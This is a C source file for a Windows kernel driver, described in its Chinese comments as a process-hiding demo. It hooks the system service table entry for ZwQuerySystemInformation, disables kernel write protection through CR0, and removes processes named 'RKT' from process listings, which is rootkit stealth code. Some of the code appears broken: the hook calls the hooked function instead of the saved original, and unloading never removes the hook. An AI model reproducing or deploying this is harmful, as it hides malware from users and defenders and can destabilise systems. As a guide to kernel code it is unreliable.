/**
 * 展示部分
 * 隐藏进程demo，
 * 通过hook SSDT方式实现
 * 对ZwQuerySystemInformation()系统调用进行hook
 */

#include <ntddk.h>
#include <windef.h>



typedef enum _SYSTEM_INFORMATION_CLASS {

	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8
}SYSTEM_INFORMATION_CLASS;


#define SystemProcessInformation 5
#define SystemProcessorPerformanceInformation 8

NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength
);

typedef NTSTATUS (*ZwQuerySystemInformationPtr)(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength
	);

//ZwQuerySystemInformation()需要的两个结构体参数定义
typedef struct _SYSTEM_PROCESS_INFO {
	ULONG NextEntryOffset;   //下一个结构体的地址
	ULONG NumberOfThreads;   //进程的线程数
	
	ULONG  Reserved[6];
	LARGE_INTEGER CreatedTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ProcessName;
	KPRIORITY BasePriority;
	HANDLE UniqueProceessId;
	PVOID Reserved3;
	ULONG HandleCount;
	BYTE  Reserved4[4];
	PVOID Reserved5[11];
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved6[6];
}SYSTEM_PROCESS_INFO,*PSYSTEM_PROCESS_INFO;

typedef struct _SYSTEM_PROCESSOR_PERFORMANCE_INFO {
	LARGE_INTEGER IdleTime;
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER Reserved1[2];
	ULONG Reserved2;
}SYSTEM_PROCESSOR_PERFORMANCE_INFO,*PSYSTEM_PROCESSOR_PERFORMANCE_INFO;

//判断是否该隐藏此进程  1表示需要隐藏  0 表示不需要隐藏
int shouldHide(PSYSTEM_PROCESS_INFO systeminfo) {
	//名称判断
	if (memcmp((*systeminfo).ProcessName.Buffer, L"RKT", 10) == 0)
		return 1;
	return 0;
}

//替换函数
NTSTATUS newZwQuerySystemInformation(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength) 
{
	NTSTATUS ntStatus;
	PSYSTEM_PROCESS_INFO cSPI;//当前进程信息
	PSYSTEM_PROCESS_INFO pSPI;//上一个结构体

	ntStatus = ((ZwQuerySystemInformationPtr)(ZwQuerySystemInformation))(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);

	if (!NT_SUCCESS(ntStatus)) {
		return(ntStatus);
	}
	if (SystemInformationClass != SystemProcessInformation) {
		return ntStatus;
	}
	cSPI = (PSYSTEM_PROCESS_INFO)SystemInformation;
	pSPI = NULL;
	while (cSPI != NULL) {
		if ((*cSPI).ProcessName.Buffer != NULL) {
			//判断是否为需要隐藏的进程名
			if (shouldHide(cSPI)) {
				//当前的进程不是第一个  第一个进程时pSPI是NULL
				if (pSPI != NULL) {
					//当前进程是最后一个
					if ((*cSPI).NextEntryOffset == 0) {
						//把他的前一个的后向指针置零  脱链
						(*pSPI).NextEntryOffset = 0;
					}
					else {
						//前一个的后向指针偏移修正
						(*pSPI).NextEntryOffset = (*pSPI).NextEntryOffset + (*cSPI).NextEntryOffset;
					}
				}
				else {//是第一个进程
					if ((*cSPI).NextEntryOffset == 0) {//只有一个进程
						SystemInformation = NULL;
					}
					else {//第一个进程但不是最后一个进程,将SystemInformation修正
						(BYTE*)SystemInformation = ((BYTE*)SystemInformation) + (*cSPI).NextEntryOffset;
					}
				}
			}
		}
		//继续处理遍历下一个进程信息
		pSPI = cSPI;
		if ((*cSPI).NextEntryOffset != 0) {
			(BYTE*)cSPI = ((BYTE*)cSPI) + (*cSPI).NextEntryOffset;
		}
		else {
			cSPI = NULL;
		}
	}
	return ntStatus;
}


//几个关键数据结构的定义
#pragma pack(1)
typedef struct  ServiceDescriptorEntry {
	DWORD *KiServiceTable;
	DWORD* CounterBaseTable;
	DWORD nSystemCalls;
	DWORD* KiArgumentTable;
}SDE,*PSDE;
#pragma pack()

typedef struct ServiceDescriptorTable {
	SDE ServiceDescriptor[4];
}SDT;

//通过更改cr0寄存器的WP位来开启或者关闭写保护
VOID disableWP_cr0() {
	//0xfffeffff  -> 11111111 11111110 11111111 11111111
	__asm {
		PUSH EBX
		MOV EBX,cr0
		AND EBX,0xfffeffff
		MOV CR0,EBX
		POP EBX
	}
	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "disable write protection\n");
	return;
}

VOID enableWP_cr0() {
	__asm {
		PUSH EBX
		MOV EBX, cr0
		OR EBX,0x00010000
		MOV CR0, EBX
		POP EBX
	}
	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "enable write protection\n");
	return;
}

//获取索引
DWORD getSSDTIndex(BYTE* address) {
	BYTE* addressOfIndex;
	DWORD indexValue;
	addressOfIndex = address + 1;
	indexValue = *((PULONG)addressOfIndex);
	return indexValue;
}

//  hook SSDT项
BYTE* hookSSDT(BYTE* oldAddr,BYTE* newAddr,DWORD *callTable) {
	PLONG target;
	DWORD indexValue;
	indexValue = getSSDTIndex(oldAddr);
	target = (PLONG) & (callTable[indexValue]);
	return ((BYTE*)InterlockedExchange(target, (LONG)newAddr));
}

VOID unHookSSDT(BYTE* oldAddr,BYTE* newAddr,DWORD* callTable) {
	PLONG target;
	DWORD indexValue;
	indexValue = getSSDTIndex(oldAddr);
	target = (PLONG) & (callTable[indexValue]);
	InterlockedExchange(target, (LONG)newAddr);
}



VOID Unload(IN PDRIVER_OBJECT DriverObject) {
	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "Driver unLoading.\n");
	return;
}


NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING regPath) {

	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "Driver running.\n");
	(*DriverObject).DriverUnload = Unload;

	__declspec(dllimport) SDE KeServiceDescriptorTable;
	PVOID callTable = KeServiceDescriptorTable.KiServiceTable;

	
	disableWP_cr0();

	hookSSDT(ZwQuerySystemInformation, newZwQuerySystemInformation, callTable);


	enableWP_cr0();


	return(STATUS_SUCCESS);
}
